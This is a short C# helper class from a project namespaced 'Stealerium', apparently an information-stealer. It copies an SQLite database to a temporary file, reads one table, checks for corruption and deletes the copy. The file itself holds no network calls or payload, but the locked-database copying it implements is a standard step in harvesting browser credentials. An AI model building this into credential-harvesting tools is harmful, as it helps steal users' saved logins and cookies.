using System;
using System.IO;

namespace Stealerium.Helpers
{
    /// <summary>
    /// The SqlReader class provides functionality to read data from an SQLite database.
    /// </summary>
    public sealed class SqlReader
    {
        /// <summary>
        /// Reads the table from the specified SQLite database.
        /// Copies the database to a temporary file for safe access.
        /// Deletes the temporary file after reading.
        /// </summary>
        /// <param name="database">The path to the SQLite database file.</param>
        /// <param name="table">The name of the table to be read.</param>
        /// <returns>
        /// An instance of SqLite with the data from the specified table,
        /// or null if the database file doesn't exist or is corrupted.
        /// </returns>
        public static SqLite ReadTable(string database, string table)
        {
            // If the specified database file does not exist, return null
            if (!File.Exists(database))
            {
                return null;
            }

            // Create a new temporary file path for copying the database
            string tempDatabasePath = Path.GetTempFileName() + ".dat";

            try
            {
                // Copy the database file to the temporary location
                File.Copy(database, tempDatabasePath);

                // Initialize the SQLite connection using the temporary database path
                var sqLiteConnection = new SqLite(tempDatabasePath);

                // Read the specified table from the database
                sqLiteConnection.ReadTable(table);

                // Check if the database is corrupted by verifying the row count
                // SQLite returns 65536 for corrupted databases
                if (sqLiteConnection.GetRowCount() == 65536)
                {
                    return null;
                }

                // Return the SQLite connection if the table was successfully read
                return sqLiteConnection;
            }
            catch (IOException ioEx)
            {
                // Handle any IO-related exceptions (e.g., file copy failure)
                Console.WriteLine($"I/O error while accessing the database: {ioEx.Message}");
                return null;
            }
            finally
            {
                // Delete the temporary file to clean up resources
                if (File.Exists(tempDatabasePath))
                {
                    File.Delete(tempDatabasePath);
                }
            }
        }
    }
}
